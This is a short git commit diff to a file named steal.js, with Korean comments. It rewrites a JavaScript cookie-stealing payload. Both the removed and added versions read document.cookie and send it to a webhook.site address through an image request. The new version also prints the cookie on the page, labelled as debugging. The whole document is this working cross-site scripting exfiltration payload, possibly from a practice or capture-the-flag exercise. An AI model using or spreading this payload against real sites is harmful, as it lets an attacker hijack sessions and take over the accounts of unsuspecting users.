53b78acca0293b04398b82c0d49e872aebc7a29e
강태윤 <gangtaeyun@gangtaeyun-ui-noteubug.local>
2026-01-02 14:44:57 +0900

    modifiy

--- steal.js
+++ steal.js
@@ -1,4 +1,11 @@
-const c = document.cookie;
-new Image().src =
-  "https://webhook.site/759f420f-8171-4dda-9238-690340e0dfb6?cookie=" +
-  encodeURIComponent(c);
+(function () {
+  const cookie = document.cookie;
+
+  // 1. Webhook.site로 쿠키 전송
+  new Image().src =
+    "https://webhook.site/759f420f-8171-4dda-9238-690340e0dfb6?cookie=" +
+    encodeURIComponent(cookie);
+
+  // 2. 화면에도 출력 (디버깅용)
+  document.body.innerText = "COOKIE: " + cookie;
+})();
